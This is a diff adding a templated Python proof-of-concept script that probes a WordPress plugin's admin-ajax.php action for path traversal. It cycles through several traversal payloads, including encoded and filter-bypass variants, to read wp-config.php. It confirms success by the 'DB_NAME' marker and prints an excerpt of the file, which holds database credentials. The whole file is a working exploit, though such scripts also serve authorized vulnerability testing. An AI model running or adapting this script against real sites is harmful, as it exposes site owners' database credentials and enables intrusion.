@@ -1,0 +1,38 @@
+import requests
+
+TARGET = "{{ target_url }}"
+ACTION = "{{ ajax_action }}"
+PARAM  = "{{ injectable_param }}"
+
+# We try to read wp-config.php, which always exists in a WP install and
+# contains the unique string "DB_NAME". Marker proves arbitrary read.
+MARKER = "DB_NAME"
+
+PAYLOADS = [
+    "../../../wp-config.php",
+    "../../../../wp-config.php",
+    "../../../../../wp-config.php",
+    "..%2F..%2F..%2Fwp-config.php",
+    "....//....//....//wp-config.php",
+    "/var/www/html/wp-config.php",
+]
+
+def test(payload: str) -> tuple[bool, int, str]:
+    resp = requests.post(
+        f"{TARGET}/wp-admin/admin-ajax.php",
+        data={"action": ACTION, PARAM: payload},
+        timeout=30,
+    )
+    return MARKER in resp.text, resp.status_code, resp.text[:300]
+
+if __name__ == "__main__":
+    print(f"[*] Testing path traversal: action={ACTION} param={PARAM}")
+    for p in PAYLOADS:
+        ok, status, body = test(p)
+        if ok:
+            print(f"[+] SUCCESS payload={p!r} status={status} marker={MARKER!r} present")
+            print(f"    response excerpt: {body!r}")
+            break
+        print(f"[-] No marker (status={status}): {p!r}")
+    else:
+        print("[!] FAILURE: no path traversal confirmed")
